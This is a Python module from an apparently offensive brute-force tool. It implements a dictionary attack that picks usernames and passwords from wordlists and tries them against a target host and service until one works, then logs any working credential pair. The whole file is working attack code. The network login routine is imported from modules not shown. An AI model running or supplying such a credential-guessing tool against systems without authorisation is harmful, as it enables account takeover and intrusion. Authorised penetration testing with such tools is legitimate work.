"""
Dictionary Attack
=================
Random-or-fixed username + random-or-fixed password picked from wordlists.
Runs up to config.max_length attempts (0 = unlimited, capped at 100 000).
"""
import random

from rich.progress import (
    Progress,
    SpinnerColumn,
    TextColumn,
    MofNCompleteColumn,
    TimeElapsedColumn,
)

from Design.colors_cli import console
from modules.target import TargetInfo
from modules.attack_config import AttackConfig, CredentialMode, load_wordlist
from modules.attacks.common import attempt, save_result, apply_delay

_MAX_UNLIMITED = 100_000


def run(target: TargetInfo, config: AttackConfig) -> None:
    # Load credential pools
    if config.username_mode == CredentialMode.RANDOM_FROM_LIST:
        users   = load_wordlist(config.username_file)
        u_label = f"random ({len(users)} entries)"
    else:
        users   = [config.username_value]
        u_label = f"fixed={config.username_value!r}"

    if config.password_mode == CredentialMode.RANDOM_FROM_LIST:
        passwords = load_wordlist(config.password_file)
        p_label   = f"random ({len(passwords)} entries)"
    else:
        passwords = [config.password_value]
        p_label   = f"fixed={config.password_value!r}"

    max_attempts = config.max_length if config.max_length > 0 else _MAX_UNLIMITED

    console.print(
        f"\n[bold primary][ DICTIONARY ATTACK ][/bold primary]\n"
        f"  [muted]Service   :[/muted] [primary]{target.service.upper()}[/primary]\n"
        f"  [muted]Username  :[/muted] [text]{u_label}[/text]\n"
        f"  [muted]Password  :[/muted] [text]{p_label}[/text]\n"
        f"  [muted]Max tries :[/muted] [primary]{max_attempts:,}[/primary]\n"
        f"  [muted]Delay     :[/muted] [text]{config.delay}s[/text]\n"
    )

    found      = False
    found_user = ""
    found_pass = ""

    with Progress(
        SpinnerColumn(style="primary"),
        TextColumn("[muted]Trying:[/muted] [text]{task.fields[cred]}[/text]"),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task_id = progress.add_task("dictionary", total=max_attempts, cred="…")

        for _ in range(max_attempts):
            user     = random.choice(users)
            password = random.choice(passwords)
            progress.update(task_id, advance=1, cred=f"{user}:{password}")

            if attempt(target.host, target.port, user, password, target.service):
                found      = True
                found_user = user
                found_pass = password
                break
            apply_delay(config.delay)

    if found:
        save_result(target.host, target.port, found_user, found_pass, config.log_file, target.service)
    else:
        console.print(
            f"\n[error]✗ No match found after {max_attempts:,} attempts.[/error]"
        )
